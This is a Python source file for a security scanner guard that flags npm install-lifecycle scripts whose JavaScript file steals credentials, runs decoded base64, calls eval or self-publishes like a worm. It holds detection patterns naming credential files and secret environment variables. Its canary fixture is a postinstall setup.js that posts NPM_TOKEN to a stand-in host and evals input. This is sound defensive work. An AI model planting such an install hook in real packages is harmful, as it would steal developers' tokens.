"""Guard: the JavaScript file an npm install-lifecycle script runs (`node <file>`) contains a
credential-theft, dynamic-execution or worm-propagation sink — checklist §8, new item; mined from
wormguard's lifecycle-script source analysis (it resolves the `node <file>` a lifecycle script runs
and inspects that file, where `npm-install-script-network` only reads the script string).

npm runs `preinstall`/`install`/`postinstall`/`prepare` automatically on install. The 2025 npm
worm waves hid their payload one hop away: `"postinstall": "node scripts/setup.js"` looks
innocent, and the dropper lives in `setup.js`. This guard follows that one hop and checks the file.

Rules (all fire on the resolved file, never on a script that only names one):

  1. **`lifecycle-script-exfil`** (HIGH): the file loads a network module (`http`/`https`/`net`/
     `tls`/`dns`/`dgram`, or calls `fetch(`) AND reads credentials: a secret-path literal
     (`.npmrc`, `.aws`, `.ssh`, `.netrc`, `id_rsa`, `.git/config`, `.docker/config`, kube config),
     a whole-environment dump (`JSON.stringify(process.env)`, `Object.entries(process.env)`,
     `{...process.env}`), or a secret-named env var (`process.env.NPM_TOKEN`, `*_SECRET`, ...).
     A bare `process.env.CI` or `npm_config_*` read next to a download is ordinary and stays quiet.
  2. **`lifecycle-script-base64-exec`** (HIGH): `Buffer.from(<long literal>, 'base64')` decoded and
     then executed (`eval`, `new Function`, `vm.run*`, `child_process`/`exec`/`spawn`).
  3. **`lifecycle-script-dynamic-eval`** (MEDIUM): `eval(` or `new Function(` in the file.
  4. **`lifecycle-script-worm-propagate`** (HIGH): the file both writes `package.json` and runs
     `npm publish`, the self-propagation pair of a worm.

`node -e '<source>'` inline code is analysed the same way. The file must resolve inside the
repository; a path that escapes it is ignored. Not traced: a file reached through `npm run <x>`,
a computed `require`, or a payload split across several files.

Suppress an audited case with `// security: allow-npm-lifecycle-script-source-sinks` in the JS
file, or the same literal anywhere in `package.json`.
"""
from __future__ import annotations

# security: allow-credential-file-path (this guard names the credential paths it detects, on purpose)
import json
import re
from pathlib import Path
from typing import Any

from agentsec.detect import StackProfile
from agentsec.findings import Finding, Severity

from .base import (
    CanaryPlant,
    Guard,
    comment_dialect_for,
    is_nonproduct_path,
    iter_files_named,
    pragma_present,
    read,
    rel,
    strip_js_comments,
)

_PRAGMA = "security: allow-npm-lifecycle-script-source-sinks"

_LIFECYCLE_KEYS = ("preinstall", "install", "postinstall", "prepare")
_MAX_JS_CHARS = 1_000_000

# `node [--flags] <file>` (optionally quoted), at a command position.
_NODE_FILE = re.compile(
    r"(?:^|[;&|(]|&&)\s*(?:\w+=\S+\s+){0,8}node(?:\.exe)?\s+(?:--?[\w-]+(?:=\S+)?\s+){0,8}"
    r"""(?:"([^"\s]+)"|'([^'\s]+)'|([^\s;&|"'<>()]+))"""
)
# `node -e '<inline>'` / `node --eval "<inline>"` / `node -p`.
_NODE_INLINE = re.compile(
    r"""\bnode(?:\.exe)?\s+(?:-e|-p|--eval|--print)\s+(?:"((?:[^"\\]|\\.)*)"|'([^']*)')""", re.DOTALL
)

_NET_MODULE = re.compile(
    r"""\brequire\s*\(\s*['"`](?:node:)?(?:https?|net|tls|dns|dgram)['"`]\s*\)"""
    r"""|\bfrom\s+['"`](?:node:)?(?:https?|net|tls|dns|dgram)['"`]"""
    r"""|\bimport\s*\(\s*['"`](?:node:)?(?:https?|net|tls|dns|dgram)['"`]\s*\)"""
    r"|(?<![\w.])fetch\s*\(",
)
_SECRET_PATH = re.compile(
    r"""\.npmrc\b|\.aws\b|\.ssh\b|\.netrc\b|\bid_rsa\b|\.git/config\b|\.docker/config|\.kube/config"""
)
_ENV_DUMP = re.compile(
    r"JSON\.stringify\(\s*process\.env\b|Object\.(?:entries|keys|values|assign)\(\s*(?:\{\}\s*,\s*)?process\.env\b"
    r"|\.\.\.\s*process\.env\b|\bprocess\.env\s*\)"
)
_SECRET_ENV = re.compile(
    r"process\.env(?:\.|\[\s*['\"])[A-Z0-9_]*(?:TOKEN|SECRET|PASSWORD|PASSWD|API_?KEY|PRIVATE_KEY|CREDENTIAL)[A-Z0-9_]*"
    r"|process\.env(?:\.|\[\s*['\"])(?:AWS_[A-Z_]+|NPM_CONFIG__AUTH\w*)"
)
_B64_LITERAL = re.compile(r"""Buffer\.from\(\s*(['"`])[A-Za-z0-9+/=_-]{24,}\1\s*,\s*['"]base64['"]""")
_EXEC_SINK = re.compile(
    r"\beval\s*\(|\bnew\s+Function\s*\(|\bvm\.(?:runIn\w+|Script)\b|\bchild_process\b|\b(?:exec|execSync|spawn|spawnSync)\s*\("
)
_DYNAMIC_EVAL = re.compile(r"(?<![\w.$])eval\s*\(|\bnew\s+Function\s*\(")
_WRITE_PKG = re.compile(r"writeFile\w*\s*\([^;]{0,200}package\.json|package\.json[^;]{0,120}writeFile\w*\s*\(")
_NPM_PUBLISH = re.compile(r"""\bnpm(?:\.cmd)?['"`\s,\[\]]+publish\b""")

_STD = ["CWE-506", "CWE-829", "OWASP-ASI:ASI04"]


def _load(raw: str) -> dict[str, Any] | None:
    try:
        data = json.loads(raw)
    except (ValueError, RecursionError):
        return None
    return data if isinstance(data, dict) else None


def _candidate_paths(base: Path, arg: str) -> list[Path]:
    p = base / arg
    return [p] if p.suffix else [base / (arg + ".js"), base / arg / "index.js"]


def _analyse(src: str) -> list[tuple[str, Severity, str]]:
    """(rule suffix, severity, what was seen) for each sink present in `src`."""
    code = strip_js_comments(src)
    hits: list[tuple[str, Severity, str]] = []
    if _NET_MODULE.search(code):
        reads: list[str] = []
        if _SECRET_PATH.search(code):
            reads.append("a credential file path")
        if _ENV_DUMP.search(code):
            reads.append("a dump of process.env")
        if _SECRET_ENV.search(code):
            reads.append("a secret-named environment variable")
        if reads:
            hits.append((
                "lifecycle-script-exfil", "high",
                f"loads a network module and reads {', '.join(reads)}",
            ))
    if _B64_LITERAL.search(code) and _EXEC_SINK.search(code):
        hits.append((
            "lifecycle-script-base64-exec", "high",
            "decodes a long base64 literal with Buffer.from and executes code",
        ))
    if _DYNAMIC_EVAL.search(code):
        hits.append(("lifecycle-script-dynamic-eval", "medium", "calls eval() or new Function()"))
    if _WRITE_PKG.search(code) and _NPM_PUBLISH.search(code):
        hits.append((
            "lifecycle-script-worm-propagate", "high",
            "rewrites package.json and runs `npm publish` (self-propagating worm pair)",
        ))
    return hits


class NpmLifecycleScriptSourceSinksGuard(Guard):
    id = "npm-lifecycle-script-source-sinks"
    title = "An npm install-lifecycle script runs a JavaScript file that steals credentials, evals, or self-publishes"
    area = "AI agent"

    # npm-lifecycle-script-source-sinks-canary/: package.json's postinstall runs scripts/setup.js,
    # which sends process.env.NPM_TOKEN over https and eval()s a string -> fires
    # npm-lifecycle-script-source-sinks/lifecycle-script-exfil and .../lifecycle-script-dynamic-eval.
    canary_plant = CanaryPlant(
        files={
            "npm-lifecycle-script-source-sinks-canary/package.json": (
                '{\n'
                '  "name": "example-app",\n'
                '  "scripts": { "postinstall": "node scripts/setup.js" }\n'
                '}\n'
            ),
            "npm-lifecycle-script-source-sinks-canary/scripts/setup.js": (
                "const https = require('https');\n"
                "const body = JSON.stringify({ t: process.env.NPM_TOKEN });\n"
                "https.request('https://collector.example.com/in', { method: 'POST' }).end(body);\n"
                "eval(process.argv[2] || '0');\n"
            ),
        },
        expects=frozenset({
            "npm-lifecycle-script-source-sinks/lifecycle-script-exfil",
            "npm-lifecycle-script-source-sinks/lifecycle-script-dynamic-eval",
        }),
    )

    def applies(self, profile: StackProfile) -> bool:  # noqa: ARG002
        return True

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        out: list[Finding] = []
        try:
            root_resolved = root.resolve()
        except OSError:
            return out
        seen: set[tuple[str, str]] = set()
        for f in iter_files_named(root, "package.json"):
            r = rel(root, f)
            if is_nonproduct_path(r, profile.archive_segments):
                continue
            raw = read(f)
            if not raw or pragma_present(_PRAGMA, raw, dialect=None):
                continue
            data = _load(raw)
            scripts = data.get("scripts") if data else None
            if not isinstance(scripts, dict):
                continue
            for key in _LIFECYCLE_KEYS:
                value = scripts.get(key)
                if not isinstance(value, str):
                    continue
                for label, src, where in self._sources(f, root, root_resolved, value):
                    if pragma_present(_PRAGMA, src, dialect=comment_dialect_for(where or "x.js")):
                        continue
                    for suffix, severity, seen_what in _analyse(src):
                        if (where or r + key, suffix) in seen:
                            continue
                        seen.add((where or r + key, suffix))
                        out.append(Finding(
                            check_id=self.id,
                            severity=severity,
                            title=self.title,
                            location=where or r,
                            message=(
                                f"`scripts.{key}` in {r} runs automatically on install and executes "
                                f"{label}, which {seen_what}. A one-hop indirection through a script "
                                "file is how install-time malware stays out of the package.json "
                                "diff."
                            ),
                            remediation=(
                                "Read the script. If it is not needed at install time, remove the "
                                "lifecycle hook; otherwise drop the credential access, eval and "
                                "publish logic from it."
                            ),
                            rule=f"npm-lifecycle-script-source-sinks/{suffix}",
                            standards=list(_STD),
                        ))
        return out

    def _sources(
        self, pkg: Path, root: Path, root_resolved: Path, value: str
    ) -> list[tuple[str, str, str]]:
        """(description, source text, repo-relative file or "" for inline) for what `value` runs."""
        res: list[tuple[str, str, str]] = []
        for m in _NODE_INLINE.finditer(value):
            inline = m.group(1) or m.group(2) or ""
            if inline:
                res.append(("an inline `node -e` program", inline, ""))
        for m in _NODE_FILE.finditer(value):
            arg = m.group(1) or m.group(2) or m.group(3) or ""
            if not arg or arg.startswith("-") or "$" in arg:
                continue
            for cand in _candidate_paths(pkg.parent, arg):
                try:
                    resolved = cand.resolve()
                    resolved.relative_to(root_resolved)
                except (OSError, ValueError):
                    continue
                if not resolved.is_file():
                    continue
                text = read(resolved)
                if text and len(text) <= _MAX_JS_CHARS:
                    res.append((f"`{arg}`", text, rel(root, resolved)))
                break
        return res
